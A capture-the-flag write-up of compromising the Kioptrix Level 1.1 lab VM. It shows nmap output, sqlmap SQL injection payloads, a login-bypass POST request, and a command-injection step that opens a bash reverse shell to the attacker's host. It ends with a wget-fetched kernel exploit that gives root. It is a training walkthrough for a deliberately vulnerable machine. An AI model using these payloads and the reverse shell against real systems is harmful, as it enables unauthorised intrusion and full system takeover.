#  Kioptrix: Level 1.1 (#2)

## Recon & Enummeration

Nmap shows us 
```
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
..... etc etc
```


## Intitial Foothold

### SQL injection

We find a login page to the "Basic Administrative Web Console". We run sqlmap against it:

```
[13:15:27] [WARNING] POST parameter 'btnLogin' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 3223 HTTP(s) requests:
---
Parameter: psw (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin&psw=-9096' OR 1599=1599 AND 'ewpR'='ewpR&btnLogin=Login

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
    Payload: uname=admin&psw=admin' AND 5541=BENCHMARK(5000000,MD5(0
```

We end up with the following POST request to login to the admin portal:


```
POST /index.php HTTP/1.1
Host: 10.10.10.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Origin: http://10.10.10.6
Connection: close
Referer: http://10.10.10.6/index.php
Upgrade-Insecure-Requests: 1

uname=admin&psw=' OR 'login'='login&btnLogin=Logins
```

### Command execution

Once we're in the portal we can enter an IP address to ping.
Assumed it's injectable a simple `; whoami` input tells us we run as user apache and we have code execution.

To drop the shell we submit: `; bash -i >& /dev/tcp/10.10.10.4/1234 0>&1`



## Privilege Escalation

Since the kernel is outdated we can find 2 different exploits in exploit db for this cent os version:

- `'sock_sendpage()' Ring0 Privilege Escalation`
- `'ip_append_data()' Ring0 Privilege Escalation`   

The `'ip_append_data()'` didn't wwork, therefore we chose to use the first exploit with success this time:

```
bash-3.00$ wget http://10.10.10.4:8000/9479.c
--19:30:51--  http://10.10.10.4:8000/9479.c
           => `9479.c'
Connecting to 10.10.10.4:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3,507 (3.4K) [text/x-csrc]

100%[========================================================================>] 3,507         --.--K/s             

19:30:51 (15.27 MB/s) - `9479.c' saved [3507/3507]

bash-3.00$ gcc -o exploit 9479.c 
9479.c:130:28: warning: no newline at end of file
bash-3.00$ ./exploit 
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
```
